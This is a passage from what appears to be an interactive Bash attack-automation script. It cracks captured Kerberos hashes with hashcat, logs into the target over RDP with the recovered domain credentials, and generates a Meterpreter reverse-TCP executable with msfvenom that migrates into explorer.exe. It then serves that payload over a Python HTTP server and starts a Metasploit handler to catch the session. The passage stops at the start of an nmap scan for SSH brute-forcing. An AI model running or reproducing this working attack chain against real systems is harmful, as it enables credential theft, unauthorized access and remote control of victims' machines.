			#validate if user selected network scan
			if [ "$ATTACK_MENU_HASHCAT" -eq 1 ] && [ "$NETWORK_TARGET_CHECKER" -eq 1 ]; then
				#present the scan/attack menu to the user
				ATTACK_MENU
			fi
			#validate if user selected single scan target
			if [ "$ATTACK_MENU_HASHCAT" -eq 1 ] && [ "$SINGLE_TARGET_CHECKER" -eq 1 ]; then
				#present the scan/attack menu to the user
				ATTACK_MENU
			fi
			#get user to either to proceed with remote desktop protocol connection or to set up metasploit payload
			RDP_FINAL
		else
			#locate $FNAME_PATH filename and assign it's path to a variable. Takes in 1 argument $1
			SEARCH_FNAME $FNAME_WORDLIST
			#validate if $FNAME_PATH is not empty
			if [ ! -z "$FNAME_PATH" ]; then
				#assign checker variable for while loop
				CONFIRM_WORDLIST_CHECKER=0
				while [ "$CONFIRM_WORDLIST_CHECKER" -eq 0 ]
				do
					#get user confirmation for the filename
					echo -e -n "${Yellow}[?]${NC} Confirm filename:${Cyan}$FNAME_PATH${NC} (y/n) "
					read CONFIRM_WORDLIST
						case $CONFIRM_WORDLIST in
						y | Y | Yes | YES | yes )
						#locate $FNAME_PATH filename and assign it's path to a variable. Takes in 1 argument $1
						SEARCH_FNAME $FNAME_WORDLIST
						#validate if $FNAME_PATH is not empty
						if [ ! -z "$FNAME_PATH" ]; then
							cd $RDP_DIR_PATH
							cat $FNAME_PATH > $RDP_DIR_PATH/$HASHCAT_WORDLIST
							#execute hashcat using user's provided information
							HASHCAT_RUN
							HASHCAT_WORDLIST_CHECKER=1
							CONFIRM_WORDLIST_CHECKER=1
						else
							echo -e "${Light_Red}[!]${NC} The file ${Cyan}$FNAME_HASH${NC} ${Light_Red}does not exits${NC}. Please try again."
							#execute hashcat using user's provided information
							HASHCAT_SETUP
							HASHCAT_WORDLIST_CHECKER=1
							CONFIRM_WORDLIST_CHECKER=1
						fi
						shift
						;;
						n | N | No | NO | no )
						#execute hashcat using user's provided information
						HASHCAT_SETUP
						HASHCAT_WORDLIST_CHECKER=1
						CONFIRM_WORDLIST_CHECKER=1
						shift
						;;
						r | R | return | Return | RETURN )
						#present the scan/attack menu to the user
						ATTACK_MENU
						shift
						;;
						* )
						echo -e "\n${Light_Red}[!]${NC} Wrong input. Please enter '${Orange}y${NC}', '${Orange}n${NC}' or '${Orange}R${NC}' to ${Orange}R${NC}eturn to Attack Menu.\n"
						shift
						;;
					esac	
				done
			else
				echo -e "${Light_Red}[!]${NC} The file ${Cyan}$FNAME_WORDLIST${NC} ${Light_Red}does not exits${NC}. Please try again.\n"
			fi
		fi
	done
}

#execute hashcat using user's provided information
function HASHCAT_RUN {
	#resets $FNAME_HASH
	FNAME_HASH=''
	#assign session time to variable
	DATETIME_UTC_SESSION=$(date -u +"%F %H:%M:%S")
	echo -e "\n${White}Event Date/Time: $(echo $DATETIME_UTC_SESSION) UTC${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	echo -e "${Light_Purple}Hashcat${NC} ${Green}$(echo $RDP_TARGET)${NC}'s credentials" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	#assign hash filename variable
	HASHCAT_FHASH="cipher.hash"
	HASHCAT_FPOTFILE="hashcat.pot"
	echo -e "\n${Light_Purple}[*]${NC} Please save the acquired cipher into a file."
	echo -e "${Light_Purple}[*]${NC} Hash Format Example: \$krb5pa\$18\$hashcat\$HASHCATDOMAIN.COM\$96c28...9cce69770"
	#assign checker variable for while loop
	HASHCAT_FHASH_CHECKER=0
	while [ "$HASHCAT_FHASH_CHECKER" -eq 0 ]
	do
		echo -e "${Light_Purple}[${NC}${Orange}R${NC}${Light_Purple}]${NC} ${Yellow}R${NC}eturn back to previous options "
		#get user input filename for the cipher
		echo -e -n "${Yellow}[?]${NC} Please enter the ${Cyan}filename${NC} for the hash: "
		read FNAME_HASH
		#validate if $FNAME_HASH is empty
		if [ -z "$FNAME_HASH" ]; then
			echo -e "\n${Light_Red}[!]${NC} No input captured. Please try again.\n"
		elif [ "$FNAME_HASH" == "r" ] || [ "$FNAME_HASH" == "R" ]; then
			#execute hashcat using user's provided information
			HASHCAT_SETUP
		else
			#locate $FNAME_PATH filename and assign it's path to a variable. Takes in 1 argument $1
			SEARCH_FNAME $FNAME_HASH
			#validate if $FNAME_PATH is not empty
			if [ ! -z "$FNAME_PATH" ]; then
				#assign checker variable for while loop
				CONFIRM_FHASH_CHECKER=0
				while [ "$CONFIRM_FHASH_CHECKER" -eq 0 ]
				do
					#get user confirmation for the filename
					echo -e -n "${Yellow}[?]${NC} Confirm filename:${Cyan}$FNAME_PATH${NC} (y/n) "
					read CONFIRM_FHASH
						case $CONFIRM_FHASH in
						y | Y | Yes | YES | yes )
						#locate $FNAME_PATH filename and assign it's path to a variable. Takes in 1 argument $1
						SEARCH_FNAME $FNAME_HASH
						#validate if $FNAME_PATH is not empty
						if [ ! -z "$FNAME_PATH" ]; then
							#change directory to $RDP_DIR_PATH
							cd $RDP_DIR_PATH
							cat $FNAME_PATH > $RDP_DIR_PATH/$HASHCAT_FHASH
							DC_USERNAME=$(cat $HASHCAT_FHASH | sed 's/\$/ /g' | awk -F " " '{print $3}')
							DC_DOMAINNAME=$(cat $HASHCAT_FHASH | sed 's/\$/ /g' | awk -F " " '{print $4}')
							echo -e "\n${Light_Purple}[-]${NC} Executing Hashcat to process the hash. Please wait patiently..."
							#locate $FNAME_PATH filename and assign it's path to a variable. Takes in 1 argument $1
							SEARCH_FNAME $HASHCAT_FPOTFILE
							#validate if $FNAME_PATH is not empty
							if [ ! -z "$FNAME_PATH" ]; then
								rm $HASHCAT_FPOTFILE
							fi
							#locate $FNAME_PATH filename and assign it's path to a variable. Takes in 1 argument $1
							SEARCH_FNAME $HASHCAT_FPOTFILE
							#validate if $FNAME_PATH is empty
							if [ -z "$FNAME_PATH" ]; then
								hashcat -m 19900 $(cat $HASHCAT_FHASH) $HASHCAT_WORDLIST --potfile-disable --outfile $HASHCAT_FPOTFILE >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME 
							fi	
							#locate $FNAME_PATH filename and assign it's path to a variable. Takes in 1 argument $1
							SEARCH_FNAME $HASHCAT_FPOTFILE
							#validate if $FNAME_PATH is not empty
							if [ ! -z "$FNAME_PATH" ]; then
								DC_PW=$(cat $HASHCAT_FPOTFILE | awk -F ":" '{print $NF}')
								echo -e "\n${White}[*] Remote Desktop Login Credentials:${NC}" | tee -a $SESSION_DIR_PATH/$SESSION_ID_FILENAME
								echo -e "${Light_Purple}[*]${NC} Domain Name: ${Cyan}$(echo $DC_DOMAINNAME)${NC}" | tee -a $SESSION_DIR_PATH/$SESSION_ID_FILENAME
								echo -e "${Light_Purple}[*]${NC} Username: ${Cyan}$(echo $DC_USERNAME)${NC}" | tee -a $SESSION_DIR_PATH/$SESSION_ID_FILENAME
								echo -e "${Light_Purple}[*]${NC} Password: ${Cyan}$(echo $DC_PW)${NC}" | tee -a $SESSION_DIR_PATH/$SESSION_ID_FILENAME
								#validate if user selected network scan
								if [ "$ATTACK_MENU_HASHCAT" -eq 1 ] && [ "$NETWORK_TARGET_CHECKER" -eq 1 ]; then
									#present the scan/attack menu to the user
									ATTACK_MENU
								fi
								#validate if user selected single target scan
								if [ "$ATTACK_MENU_HASHCAT" -eq 1 ] && [ "$SINGLE_TARGET_CHECKER" -eq 1 ]; then
									RDP_TARGET=$LAN_IP_TARGET
								fi
								#get user to either to proceed with remote desktop protocol connection or to set up metasploit payload
								RDP_FINAL
								HASHCAT_FHASH_CHECKER=1
								CONFIRM_FHASH_CHECKER=1
							else
								echo -e "${Light_Red}[!]${NC} The temporary file ${Cyan}$HASHCAT_FPOTFILE${NC} ${Light_Red}does not exits${NC}. Please try again."
								#execute hashcat using user's provided information
								HASHCAT_RUN
								HASHCAT_FHASH_CHECKER=1
								CONFIRM_FHASH_CHECKER=1
							fi
						else
							echo -e "${Light_Red}[!]${NC} The file ${Cyan}$FNAME_HASH${NC} ${Light_Red}does not exits${NC}. Please try again."
							#execute hashcat using user's provided information
							HASH_SETUP
							HASHCAT_FHASH_CHECKER=1
							CONFIRM_FHASH_CHECKER=1
						fi
						shift
						;;
						n | N | No | NO | no )
						#execute hashcat using user's provided information
						HASHCAT_RUN
						HASHCAT_FHASH_CHECKER=1
						CONFIRM_FHASH_CHECKER=1
						shift
						;;
						r | R | return | Return | RETURN )
						#present the scan/attack menu to the user
						ATTACK_MENU
						shift
						;;
						* )
						echo -e "\n${Light_Red}[!]${NC} Wrong input. Please enter '${Orange}y${NC}', '${Orange}n${NC}' or '${Orange}R${NC}' to ${Orange}R${NC}eturn to Attack Menu.\n"
						shift
						;;
					esac	
				done
			else
				echo -e "${Light_Red}[!]${NC} The file ${Cyan}$FNAME_HASH${NC} ${Light_Red}does not exits${NC}. Please try again."
				#execute hashcat using user's provided information
				HASHCAT_RUN
				HASHCAT_FHASH_CHECKER=1
			fi
		fi
	done
}

#get user to either to proceed with remote desktop protocol connection or to set up metasploit payload
function RDP_FINAL {
	echo -e "\n${Light_Purple}------------------------${NC}"
	echo -e "${Light_Cyan}RDP${NC} ${White}/${NC} ${Light_Cyan}METASPLOIT${NC} ${White}OPTIONS${NC}"
	echo -e "${Light_Purple}------------------------${NC}"
	echo -e "${Light_Purple}[${NC}${Orange}1${NC}${Light_Purple}]${NC} Start Remote Desktop Connection: ${Green}$(echo $RDP_TARGET)${NC}"
	echo -e "${Light_Purple}[${NC}${Orange}2${NC}${Light_Purple}]${NC} Setup Metasploit Payload"
	echo -e "${Light_Purple}[${NC}${Orange}3${NC}${Light_Purple}]${NC} Start Msfconsole"
	echo -e "${Light_Purple}[${NC}${Orange}B${NC}${Light_Purple}]${NC} ${Orange}B${NC}ack To Remote Desktop Protocol Attack Menu"
	echo -e "${Light_Purple}[${Orange}R${NC}${Light_Purple}]${NC} ${Orange}R${NC}eturn to Main Menu"
	echo -e "${Light_Purple}[${Orange}G${NC}${Light_Purple}]${NC} ${Orange}G${NC}o To Scanning/Attack Menu"
	echo -e "${Light_Purple}[${Orange}Q${NC}${Light_Purple}]${NC} ${Orange}Q${NC}uit"
	echo -e "${Light_Purple}------------------------${NC}"
	#assign checker variable for while loop	
	CHOOSE_RDPFINAL_CHECKER=0
	while [ "$CHOOSE_RDPFINAL_CHECKER" -eq 0 ]
	do
		echo -e -n "${Yellow}[?]${NC} Please select '${Orange}1${NC}', '${Orange}2${NC}', '${Orange}3${NC}', '${Orange}B${NC}', '${Orange}R${NC}', '${Orange}G${NC}' or '${Orange}Q${NC}': "
		read CHOOSE_FINAL
		case $CHOOSE_FINAL in
			1 )
			#execute remote desktop protocol attack $DC_DOMAINNAME $DC_USERNAME $DC_PW $RDP_TARGET
			RDP_RUN
			CHOOSE_RDPFINAL_CHECKER=1
			shift
			;;
			2 )
			#get LPORT number from user to setup payload
			PAYLOAD_SETUP
			CHOOSE_RDPFINAL_CHECKER=1
			shift
			;;
			3 )
			#create listener.rc and start msfconsole
			MSFCONSOLE_START
			#get user to either to proceed with remote desktop protocol connection or to set up metasploit payload
			RDP_FINAL
			CHOOSE_RDPFINAL_CHECKER=1
			shift
			;;
			b | B | back | Back | BACK )
			#presents remote desktop protocol Attack menu to the user
			RDP_MENU
			CHOOSE_RDPFINAL_CHECKER=1
			shift
			;;
			r | R | return | Return | RETURN)
			#presents to user the main menu to choose a single target or to scan for a local area network
			MAIN_MENU
			CHOOSE_RDPFINAL_CHECKER=1
			shift
			;;
			g | G | go | Go | GO)
			#present the scan/attack menu to the user
			ATTACK_MENU
			CHOOSE_RDPFINAL_CHECKER=1
			shift
			;;
			q | Q | quit | Quit | QUIT )
			exit
			shift
			;;
			* )
			echo -e "\n${Light_Red}[!]${NC} Wrong input. Please try again.\n"
			shift
			;;
		esac
	done
}

#execute remote desktop protocol attack $DC_DOMAINNAME $DC_USERNAME $DC_PW $RDP_TARGET
function RDP_RUN {
	#assign hash filename variable
	HASHCAT_FHASH="cipher.hash"
	HASHCAT_FPOTFILE="hashcat.pot"
	#locate a filename and assign it's path to variables $FNAME_PATH1 and $FNAME_PATH2 respectively. Takes in total 2 arguments $1, $2
	SEARCH_FNAMES $HASHCAT_FHASH $HASHCAT_FPOTFILE
	#validate if $HASHCAT_FHASH and $HASHCAT_FPOTFILE files exist
	if [ -f "$FNAME_PATH1" ] || [ -f "$FNAME_PATH2" ];then
		DC_USERNAME=$(cat $RDP_DIR_PATH/$HASHCAT_FHASH | sed 's/\$/ /g' | awk -F " " '{print $3}')
		DC_DOMAINNAME=$(cat $RDP_DIR_PATH/$HASHCAT_FHASH | sed 's/\$/ /g' | awk -F " " '{print $4}')
		DC_PW=$(cat $RDP_DIR_PATH/$HASHCAT_FPOTFILE | awk -F ":" '{print $NF}')
		DATETIME_UTC_SESSION=$(date -u +"%F %H:%M:%S")
		echo -e "\n${White}Event Date/Time: $(echo $DATETIME_UTC_SESSION) UTC${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
		echo -e "${Light_Purple}xfreerdp /u:${NC}${Cyan}$(echo $DC_USERNAME)${NC} ${Light_Purple}/d:${NC}${Cyan}$(echo $DC_DOMAINNAME)${NC} ${Light_Purple}/p:${NC}${Cyan}$(echo $DC_PW)${NC} ${Light_Purple}/v:${NC}${Cyan}$(echo $RDP_TARGET)${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
		echo -e "\n${Light_Purple}[-]${NC} Connecting to ${Green}$RDP_TARGET${NC}..."
		xterm -e bash -c "xfreerdp /u:$(echo $DC_USERNAME) /d:$(echo $DC_DOMAINNAME) /p:$(echo $DC_PW) /v:$(echo $RDP_TARGET) /sec:tls" & 
		#get user to either to proceed with remote desktop protocol connection or to set up metasploit payload
		RDP_FINAL
	else
		echo -e "\n${Light_Red}[!]${NC} The required login credentials are not available. Please execute Hashcat to process the cipher."
		#present the scan/attack menu to the user
		ATTACK_MENU
	fi
	
}
			
#get LPORT number from user to setup payload
function PAYLOAD_SETUP {
	#resets $LPORT
	LPORT=''
	echo -e "\n${Light_Purple}---------------------${NC}"
	echo -e "${White}${Light_Cyan}MSFVENOM${NC} ${White}PAYLOAD MENU${NC}"
	echo -e "${Light_Purple}---------------------${NC}"
	echo -e "${White}[*] Payload Setup:${NC} ${Cyan}lport${NC}"
	#assign checker for while loop
	LPORT_CHECKER=0
	while [ "$LPORT_CHECKER" -eq 0 ]
	do
		echo -e "${Light_Purple}[${NC}${Orange}R${NC}${Light_Purple}]${NC} ${Yellow}R${NC}eturn back to previous options "
		echo -e -n "${Yellow}[?]${NC} Please enter the ${Cyan}listening port number${NC}: "
		read LPORT
		#validate if $LPORT is empty
		if [ -z "$LPORT" ]; then
			echo -e "\n${Light_Red}[!]${NC} No input captured. Please try again.\n"
		elif [ "$LPORT" == "r" ] || [ "$LPORT" == "R" ]; then
			#resets $LPORT
			LPORT=''
			if [ "$ATTACK_MENU_MSFVENOM" -eq 1 ]; then
				#present the scan/attack menu to the user
				ATTACK_MENU
			fi
			#get user to either to proceed with remote desktop protocol connection or to set up metasploit payload
			RDP_FINAL
		else
			#assign checker variable for while loop	
			CHOOSE_LPORT_CHECKER=0
			while [ "$CHOOSE_LPORT_CHECKER" -eq 0 ]
			do
				echo -e -n "\n${Yellow}[?]${NC} Confirm using ${Green}$(echo $LPORT)${NC}? (y/n) "
				read CHOOSE_LPORT
				case $CHOOSE_LPORT in
					y | Y | Yes | YES | yes )
					#get filename from user to setup payload
					PAYLOAD_FNAME_SETUP
					LPORT_CHECKER=1
					CHOOSE_LPORT_CHECKER=1
					shift
					;;
					n | N | No | NO | no )
					echo
					CHOOSE_LPORT_CHECKER=1
					shift
					;;
					* )
					echo -e "\n${Light_Red}[!]${NC} Wrong input. Please enter '${Orange}y${NC}'or '${Orange}n${NC}'."
					shift
					;;
				esac
			done
		fi
	done
}

#get filename from user to setup payload
function PAYLOAD_FNAME_SETUP {
	#resets $PLFNAME
	PLFNAME=''
	echo -e "\n${White}[*] Payload Setup:${NC} ${Cyan}filename${NC}"
	#assign checker for while loop
	PLFNAME_CHECKER=0
	while [ "$PLFNAME_CHECKER" -eq 0 ]
	do
		echo -e "${Light_Purple}[${NC}${Orange}R${NC}${Light_Purple}]${NC} ${Yellow}R${NC}eturn back to previous options "
		echo -e -n "${Yellow}[?]${NC} Please enter the payload's ${Cyan}filename${NC}: "
		read PLFNAME
		#validate if $PLFNAME is empty
		if [ -z "$PLFNAME" ]; then
			echo -e "\n${Light_Red}[!]${NC} No input captured. Please try again.\n"
		elif [ "$PLFNAME" == "r" ] || [ "$PLFNAME" == "R" ]; then
			#resets $PLFNAME
			PLFNAME=''
			#get LPORT number from user to setup payload
			PAYLOAD_SETUP
		else
			#assign checker variable for while loop	
			CHOOSE_PLFNAME_CHECKER=0
			while [ "$CHOOSE_PLFNAME_CHECKER" -eq 0 ]
			do
				echo -e -n "\n${Yellow}[?]${NC} Confirm using ${Green}$(echo $PLFNAME)${NC}? (y/n) "
				read CHOOSE_PLFNAME
				case $CHOOSE_PLFNAME in
					y | Y | Yes | YES | yes )
					#execute msfvenom $PLFNAME $LPORT $HOST_IP
					MSFVENOM_RUN
					if [ "$ATTACK_MENU_MSFVENOM" -eq 1 ]; then
						#present the scan/attack menu to the user
						ATTACK_MENU
					fi
					#get user to either proceed with remote desktop protocol connection or to run msfconsole
					RDP_MSFC_MENU
					PLFNAME_CHECKER=1
					CHOOSE_PLFNAME_CHECKER=1
					shift
					;;
					n | N | No | NO | no )
					echo
					CHOOSE_PLFNAME_CHECKER=1
					shift
					;;
					* )
					echo -e "\n${Light_Red}[!]${NC} Wrong input. Please enter '${Orange}y${NC}' or '${Orange}n${NC}'."
					shift
					;;
				esac
			done
		fi
	done
}

#execute msfvenom $PLFNAME $LPORT $HOST_IP
function MSFVENOM_RUN {
	#assign session time to variable
	DATETIME_UTC_SESSION=$(date -u +"%F %H:%M:%S")
	echo -e "\n${White}Event Date/Time: $(echo $DATETIME_UTC_SESSION) UTC${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	echo -e "${Light_Purple}msfvenom -p${NC} ${Cyan}windows/meterpreter/reverse_tcp${NC} ${Light_Purple}lhost=${NC}${Cyan}$(echo $HOST_IP)${NC} ${Light_Purple}lport=${NC}${Cyan}$(echo $LPORT) PrependMIgrate=${NC}${Cyan}true${NC} ${Light_Purple}PrependMigrateProc=${NC}${Cyan}explorer.exe${NC} ${Light_Purple}-f${NC} ${Cyan}exe${NC} ${Light_Purple}-o${NC} ${Cyan}$(echo $PLFNAME).exe${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	echo -e "\n${White}[*] Msfvenom Payload Information:${NC}"
	echo -e "${Light_Purple}[*]${NC} LHOST: ${Green}$(echo $HOST_IP)${NC}"
	echo -e "${Light_Purple}[*]${NC} LPORT: ${Green}$(echo $LPORT)${NC}"
	echo -e "${Light_Purple}[*]${NC} Filename: ${Green}$(echo $PLFNAME)${NC}"
	cd $MSFCONSOLE_DIR_PATH
	echo -e "\n${Light_Purple}[-]${NC} Executing Msfvenom..."
	#execute msfvenom and save the payload
	msfvenom -p windows/meterpreter/reverse_tcp lhost=$(echo $HOST_IP) lport=$(echo $LPORT) PrependMIgrate=true PrependMigrateProc=explorer.exe -f exe -o $(echo $PLFNAME).exe 
	#execute SimplteHTTPServer in $MSFCONSOLE_DIR_SETUP
	HTTPSERVER_START
}

#start SimpleHTTPServer as a background process
function HTTPSERVER_START {
	#assign session time to variable
	DATETIME_UTC_SESSION=$(date -u +"%F %H:%M:%S")
	echo -e "\n${White}Event Date/Time: $(echo $DATETIME_UTC_SESSION) UTC${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	echo -e "\n${Light_Purple}[-]${NC} Executed SimpleHTTPServer: ${Green}$(echo $HOST_IP):8000${NC}" | tee -a $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	echo -e "${Light_Purple}[-]${NC} Directory Path: ${Green}$(echo $MSFCONSOLE_DIR_PATH)${NC}" | tee -a $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	PID_N=$(ps aux | grep -i simplehttpserver | grep python | awk '{print $2}')
	#validate if $PID_N is not empty
	if [ ! -z "$PID_N" ]; then
		kill -9 $PID_N
	else 
		xterm -e bash -c "python -m SimpleHTTPServer 8000" &
	fi
}

#get user to either proceed with remote desktop protocol connection or to run msfconsole
function RDP_MSFC_MENU {
	echo -e "\n${Light_Purple}[${NC}${Orange}1${NC}${Light_Purple}]${NC} Start Remote Connection: ${Green}$(echo $RDP_TARGET)${NC}"
	echo -e "${Light_Purple}[${NC}${Orange}2${NC}${Light_Purple}]${NC} Start Msfconsole"
	echo -e "${Light_Purple}[${Orange}R${NC}${Light_Purple}]${NC} ${Orange}R${NC}eturn to Main Menu"
	echo -e "${Light_Purple}[${Orange}G${NC}${Light_Purple}]${NC} ${Orange}G${NC}o To Scanning/Attack Menu"
	echo -e "${Light_Purple}[${Orange}Q${NC}${Light_Purple}]${NC} ${Orange}Q${NC}uit"
	#assign checker variable for while loop	
	CHOOSE_RDPMSFC_CHECKER=0
	while [ "$CHOOSE_RDPMSFC_CHECKER" -eq 0 ]
	do
		echo -e -n "${Yellow}[?]${NC} Please select '${Orange}1${NC}', '${Orange}2${NC}', '${Orange}R${NC}', '${Orange}G${NC}' or '${Orange}Q${NC}': "
		read CHOOSE_RDPMSFC
		case $CHOOSE_RDPMSFC in
			1 )
			#execute remote desktop protocol attack $DC_DOMAINNAME $DC_USERNAME $DC_PW $RDP_TARGET
			RDP_RUN
			CHOOSE_RDPFINAL_CHECKER=1
			shift
			;;
			2 )
			#create listener.rc and start msfconsole
			MSFCONSOLE_START
			#presents to user the main menu to choose a single target or to scan for a local area network
			MAIN_MENU
			CHOOSE_RDPFINAL_CHECKER=1
			shift
			;;
			r | R | return | Return | RETURN)
			#presents to user the main menu to choose a single target or to scan for a local area network
			MAIN_MENU
			CHOOSE_RDPFINAL_CHECKER=1
			shift
			;;
			g | G | go | Go | GO)
			#present the scan/attack menu to the user
			ATTACK_MENU
			CHOOSE_RDPFINAL_CHECKER=1
			shift
			;;
			q | Q | quit | Quit | QUIT )
			exit
			shift
			;;
			* )
			echo -e "\n${Light_Red}[!]${NC} Wrong input. Please enter '${Orange}1${NC}' or '${Orange}2${NC}'."
			shift
			;;
		esac
	done
}

#create listener.rc and start msfconsole
function  MSFCONSOLE_START {
	#resets $LPORT
	LPORT=''
	echo -e "\n${Light_Purple}------------------------${NC}"
	echo -e "${White}${Light_Cyan}MSFCONSOLE${NC} ${White}LISTENER MENU${NC}"
	echo -e "${Light_Purple}------------------------${NC}"
	echo -e "${White}[*] Msfconsole Listener Information:${NC}"
	echo -e "${Light_Purple}[*]${NC} LHOST: ${Green}$(echo $HOST_IP)${NC}"
	#validate if $LPORT is not empty
	if [ ! -z "$LPORT" ]; then
		echo -e "${Light_Purple}[*]${NC} LPORT: ${Green}$(echo $LPORT)${NC}"
	else
		#assign checker for while loop
		MSFC_LPORT_CHECKER=0
		while [ "$MSFC_LPORT_CHECKER" -eq 0 ]
		do
			echo -e "${Light_Purple}[${NC}${Orange}R${NC}${Light_Purple}]${NC} ${Yellow}R${NC}eturn back to previous options "
			echo -e -n "${Yellow}[?]${NC} Please enter the ${Cyan}listening port number${NC}: "
			read LPORT
			#validate if $LPORT is empty
			if [ -z "$LPORT" ]; then
				echo -e "\n${Light_Red}[!]${NC} No input captured. Please try again.\n"
			elif [ "$LPORT" == "r" ] || [ "$LPORT" == "R" ]; then
				#resets $LPORT
				LPORT=''
				if [ "$ATTACK_MENU_MSFCONSOLE" -eq 1 ]; then
					#present the scan/attack menu to the user
					ATTACK_MENU
				fi
				#get user to either to proceed with remote desktop protocol connection or to set up metasploit payload
				RDP_FINAL
			else
				#assign checker variable for while loop	
				CHOOSE_MSFC_LPORT_CHECKER=0
				while [ "$CHOOSE_MSFC_LPORT_CHECKER" -eq 0 ]
				do
					echo -e -n "\n${Yellow}[?]${NC} Confirm using ${Green}$(echo $LPORT)${NC}? (y/n) "
					read CHOOSE_MSFC_LPORT
					case $CHOOSE_MSFC_LPORT in
						y | Y | Yes | YES | yes )
						MSFC_LPORT_CHECKER=1
						CHOOSE_MSFC_LPORT_CHECKER=1
						shift
						;;
						n | N | No | NO | no )
						echo
						CHOOSE_MSFC_LPORT_CHECKER=1
						shift
						;;
						* )
						echo -e "\n${Light_Red}[!]${NC} Wrong input. Please enter '${Orange}y${NC}' or '${Orange}n${NC}'."
						shift
						;;
					esac
				done
			fi
		done
	fi
	#assign session time to variable
	DATETIME_UTC_SESSION=$(date -u +"%F %H:%M:%S")
	echo -e "\n${White}Event Date/Time: $(echo $DATETIME_UTC_SESSION) UTC${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	echo -e "${Light_Purple}msfconsole -r${NC} ${Cyan}$(echo $LISTENER_FNAME)${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	echo "use exploit/multi/handler" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	echo "set payload windows/meterpreter/reverse_tcp" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	echo "set lhost $(echo $HOST_IP)" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	echo "set lport $(echo $LPORT)" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	echo "exploit" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	#assign listener filename variable
	LISTENER_FNAME="listener.rc"
	#setup temporary directory to store files generated by the script
	cd $MSFCONSOLE_DIR_PATH
	echo "use exploit/multi/handler" > $(echo $LISTENER_FNAME)
	echo "set payload windows/meterpreter/reverse_tcp" >> $(echo $LISTENER_FNAME)
	echo "set lhost $(echo $HOST_IP)" >> $(echo $LISTENER_FNAME)
	echo "set lport $(echo $LPORT)" >> $(echo $LISTENER_FNAME)
	echo "exploit" >> $(echo $LISTENER_FNAME)
	#execute listener $LISTENER_FNAME
	echo -e "\n${Light_Purple}[-]${NC} Executing Msfconsole..."
	msfconsole -r $(echo $LISTENER_FNAME)
}

#presents SSH Bruteforce Attack menu to the user
function SSH_BF_MENU {
	echo
	echo -e "${Light_Purple}--------------------------${NC}"
	echo -e "${White}${Light_Cyan}SSH BRUTEFORCE ATTACK${NC} ${White}MENU${NC}"
	echo -e "${Light_Purple}--------------------------${NC}"
	#validate if user selected network scan
	if [[ "$NETWORK_TARGET_CHECKER" -eq 1 ]]; then
		echo -e "${Light_Purple}[${Orange}S${NC}${Light_Purple}]${NC} ${Orange}S${NC}elect Target"
	fi
	#validate if user selected single target scan
	if [[ "$SINGLE_TARGET_CHECKER" -eq 1 ]]; then
		echo -e "${Light_Purple}[${Orange}S${NC}${Light_Purple}]${NC} ${Orange}S${NC}can For Open Port 22: ${Green}$(echo $LAN_IP_TARGET)${NC}"
	fi
	echo -e "${Light_Purple}[${Orange}R${NC}${Light_Purple}]${NC} ${Orange}R${NC}eturn to Main Menu"
	echo -e "${Light_Purple}[${Orange}G${NC}${Light_Purple}]${NC} ${Orange}G${NC}o To Scanning/Attack Menu"
	echo -e "${Light_Purple}[${Orange}Q${NC}${Light_Purple}]${NC} ${Orange}Q${NC}uit"
	echo -e "${Light_Purple}--------------------------${NC}"
	#assign checker variable for while loop
	SSHBF_MENU_CHECKER=0
	while [ "$SSHBF_MENU_CHECKER" -eq 0 ]
	do
		echo -e -n "${Yellow}[?]${NC} Please select '${Orange}S${NC}', '${Orange}R${NC}', '${Orange}G${NC}' or '${Orange}Q${NC}': "
		read SSHBF_MENU_CHOICE
		case $SSHBF_MENU_CHOICE in
			s | S | select | Select | SELECT | scan | Scan | SCAN)
			#validate if user selected single target scan
			if [[ "$SINGLE_TARGET_CHECKER" -eq 1 ]]; then
				SSH_TARGET=$LAN_IP_TARGET
				#execute nmap on selected target for SSH
				SSH_NMAP_RUN
			fi
			#validate if user selected network scan
			if [[ "$NETWORK_TARGET_CHECKER" -eq 1 ]]; then
				#execute nmap scan for SSH Bruteforce attack and save it to a file and allow user to select the target
				SSH_BF_SUB
			fi
			SSHBF_MENU_CHECKER=1
			shift
			;;
			r | R | return | Return | RETURN)
			#presents to user the main menu to choose a single target or to scan for a local area network
			MAIN_MENU
			CHOOSE_RDPFINAL_CHECKER=1
			shift
			;;
			g | G | go | Go | GO)
			#present the scan/attack menu to the user
			ATTACK_MENU
			CHOOSE_RDPFINAL_CHECKER=1
			shift
			;;
			q | Q | quit | Quit | QUIT )
			exit
			shift
			;;
			* )
			echo -e "\n${Light_Red}[!]${NC} Wrong input. Please try again.\n"
			shift 
			;;
		esac
	done
}

#execute nmap scan for SSH Bruteforce attack and save it to a file and allow user to select the target
function SSH_BF_SUB {
	DATE_TIME=$(date -u +"D%FT%H:%M:%SZ")
	#assign arp ip list
	ARP_IP_LIST=$LAN_IP_TARGET"-"$DATE_TIME"-ip.lst"
	#assign nmap os detection filename 
	SSH_FNAME=$LAN_IP_TARGET"-"$DATE_TIME".gnmap"
	SSHIP_FNAME=$LAN_IP_TARGET"-"$DATE_TIME".ip"
	#change directory to $ARP_DIR_PATH
	cd $ARP_DIR_PATH
	#validate if $ARP_FNAME file exists
	if [ -f "$ARP_FILENAME" ]; then
		#extract only IP addresses from $ARP_FILENAME and save into a file
		cat $ARP_FILENAME | egrep -v '^#' | awk '{print $1}' > $SSH_DIR_PATH/$ARP_IP_LIST
		#executes nmap -p 22 --open
		sudo nmap -p 22 -open -iL $SSH_DIR_PATH/$ARP_IP_LIST -oG $SSH_DIR_PATH/$SSH_FNAME > /dev/null
		SSH_OPEN=$(cat $SSH_DIR_PATH/$SSH_FNAME | egrep -v '^#' | grep 22 | grep -i open | awk -F " " '{print $NF}' | head -n 1)
